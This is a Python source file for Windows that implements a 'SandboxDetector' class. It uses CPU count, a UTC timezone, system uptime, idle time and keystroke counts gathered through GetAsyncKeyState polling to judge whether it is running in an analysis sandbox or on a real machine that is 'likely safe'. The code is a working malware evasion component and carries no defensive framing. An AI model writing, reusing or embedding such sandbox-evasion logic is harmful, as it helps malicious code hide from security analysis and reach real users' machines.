import ctypes
import ctypes.wintypes
import time
from os import cpu_count
from collections import defaultdict


## WinDLL C Functions ##

GetAsyncKeyState = ctypes.windll.user32.GetAsyncKeyState
GetAsyncKeyState.argtypes = [ctypes.c_int]
GetAsyncKeyState.restype = ctypes.c_short
# flags returned from GetAsyncKeyState
KEY_IS_HELD_DOWN = ctypes.c_short(0b1000_0000_0000_0000).value
KEY_IS_HELD_DOWN_AND_PRESSED_SINCE_LAST_TIME = ctypes.c_short(0b1000_0000_0000_0001).value

# struct_LASTINPUTNFO->dwTime : TICK COUNT during time of last input
class LASTINPUTINFO(ctypes.Structure):
    _fields_ = [
        ('cbSize', ctypes.c_uint),
        ('dwTime', ctypes.c_ulong)
    ]
GetLastInputInfo = ctypes.windll.user32.GetLastInputInfo
GetLastInputInfo.argtypes = [ctypes.POINTER(LASTINPUTINFO)]
GetLastInputInfo.restype = ctypes.wintypes.BOOL

# returns : num. of MILLISECONDS since boot time
GetTickCount = ctypes.windll.kernel32.GetTickCount
GetTickCount.argtypes = []
GetTickCount.restype = ctypes.wintypes.DWORD


class SandboxDetector:

    @staticmethod
    def get_curr_timestamp_ms() -> int:
        return time.time() * 1000

    @staticmethod
    def get_time_since_boot_ms() -> int:
        return GetTickCount()

    @staticmethod
    def is_key_pressed(vKey) -> bool:
        flag = GetAsyncKeyState(vKey)
        if flag == KEY_IS_HELD_DOWN \
        or flag == KEY_IS_HELD_DOWN_AND_PRESSED_SINCE_LAST_TIME:
            return True
        return False

    # default arg values are for testing
    def __init__(
        self,
        max_detector_runtime_ms=20*1000,
        max_time_since_last_input_ms=60*1000,
        min_required_total_inputs=10,
        min_time_since_boot_ms=10*60*1000
    ):
        # can be set to values you see fit 
        self.max_detector_runtime_ms = max_detector_runtime_ms
        self.max_time_since_last_input_ms = max_time_since_last_input_ms
        self.min_required_total_inputs = min_required_total_inputs
        self.min_time_since_boot_ms = min_time_since_boot_ms
        # track these
        self._is_max_time_since_last_input_passed = False
        self._total_keystrokes = 0
        self.__is_key_still_being_pressed = defaultdict(lambda: True)
        # struct
        self.__struct_LASTINPUTINFO = LASTINPUTINFO()
        self.__struct_LASTINPUTINFO.cbSize = ctypes.sizeof(LASTINPUTINFO)
        self._ptr_struct_LASTINPUTINFO = ctypes.pointer(self.__struct_LASTINPUTINFO)

    def _get_time_since_last_input_ms(self) -> int:
        return self.get_time_since_boot_ms() - self._get_tick_count_during_last_input()

    def _get_tick_count_during_last_input(self) -> int:
        GetLastInputInfo(ctypes.byref(self.__struct_LASTINPUTINFO))
        return self._ptr_struct_LASTINPUTINFO.contents.dwTime

    def _get_time_since_last_input_ms(self) -> int:
        return self.get_time_since_boot_ms() - self._get_tick_count_during_last_input()
    
    def _is_sandbox_criteria_met_before_polling(self) -> bool:
        if 'UTC' in time.tzname:
            return True
        if cpu_count() < 4:
            return True
        # elapsed-time-based pre-polling checks
        _curr_time = self.get_curr_timestamp_ms()
        _last_input_time = _curr_time - self._get_time_since_last_input_ms()
        if self.get_time_since_boot_ms() >= self.min_time_since_boot_ms:
            # time of last user input is too far from current time
            if _curr_time - _last_input_time > self.max_time_since_last_input_ms:
                return True

    def _is_sandbox_criteria_met_after_polling(self) -> bool:
        is_criteria_met = False
        # check if there is not enough user interaction
        if self._total_keystrokes < self.min_required_total_inputs:
            is_criteria_met = True
        return is_criteria_met

    def _poll_for_user_inputs(self) -> None:
        # count keystrokes
        for vKey in range(0x20, 0x7F):
            if self.is_key_pressed(vKey):
                if not self.__is_key_still_being_pressed[vKey]:
                    self._total_keystrokes += 1
                    # requires the key to be LIFTED first
                    # before counting as a new press
                    self.__is_key_still_being_pressed[vKey] = True
            else:
                self.__is_key_still_being_pressed[vKey] = False

    """ returns True if sandbox likely, False if likely safe """
    def run(self) -> bool:
        run_start_timestamp_ms = self.get_curr_timestamp_ms()
        last_poll_timestamp_ms = run_start_timestamp_ms
        # before polling
        if self._is_sandbox_criteria_met_before_polling():
            return True
        # polling
        while last_poll_timestamp_ms - run_start_timestamp_ms \
        <= self.max_detector_runtime_ms:
            self._poll_for_user_inputs()
            last_poll_timestamp_ms = self.get_curr_timestamp_ms()
        # after polling
        if self._is_sandbox_criteria_met_after_polling():
            return True
        return False

